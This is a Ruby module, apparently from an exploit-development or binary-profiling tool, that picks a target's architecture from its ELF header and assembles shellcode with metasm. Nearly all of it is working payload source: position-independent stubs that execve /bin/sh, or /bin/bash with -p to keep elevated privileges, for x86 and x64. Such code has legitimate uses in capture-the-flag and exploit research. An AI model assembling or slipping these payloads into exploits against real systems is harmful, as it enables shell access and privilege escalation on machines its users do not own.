# frozen_string_literal: true

require "metasm"

module AugureProfiler
  # The target's word size, from the ELF class: which shellcode variant
  # to assemble and how wide the return address is.
  def self.arch(path)
    elf = Metasm::ELF.decode_file(path)
    (elf.header.e_class.to_s == "64") ? :x64 : :x86
  end

  # The payload source: assembly TEXT, versioned and auditable, assembled
  # on demand. No hex blobs - the shellcode of the original tool (%shc in
  # dbg.pm) becomes readable source assembled by metasm, which the
  # profiler already depends on. The jump-call layout keeps every stub
  # position-independent without relocations.
  module Shellcode
    SOURCES = {
      sh_x64: <<~ASM,
        call shellcode
        path:
          db "/bin/sh", 0
        shellcode:
          pop rdi
          xor esi, esi
          xor edx, edx
          push 59
          pop rax
          syscall
      ASM
      sh_x86: <<~ASM,
        call shellcode
        path:
          db "/bin/sh", 0
        shellcode:
          pop ebx
          xor ecx, ecx
          push 11
          pop eax
          int 80h
      ASM
      bash_x64: <<~ASM,
        call shellcode
        path:
          db "/bin/bash", 0
        arg:
          db "-p", 0
        shellcode:
          pop rdi
          lea rsi, [rdi+10]
          push 0
          mov rdx, rsp
          push rsi
          push rdi
          mov rsi, rsp
          pop rdi
          mov eax, 59
          syscall
      ASM
      bash_x86: <<~ASM
        call shellcode
        path:
          db "/bin/bash", 0
        arg:
          db "-p", 0
        shellcode:
          pop ebx
          lea ecx, [ebx+10]
          push 0
          mov edx, esp
          push ecx
          push ebx
          mov ecx, esp
          mov eax, 11
          int 80h
      ASM
    }.freeze

    # klass: Metasm::X64 or Metasm::Ia32 (the target architecture).
    # Returns the assembled bytes.
    def self.generate(klass, stub = :sh)
      arch = (klass == Metasm::X64) ? :x64 : :x86
      source = SOURCES.fetch(:"#{stub}_#{arch}")
      Metasm::Shellcode.assemble(klass.new, source).encode_string
    end
  end
end
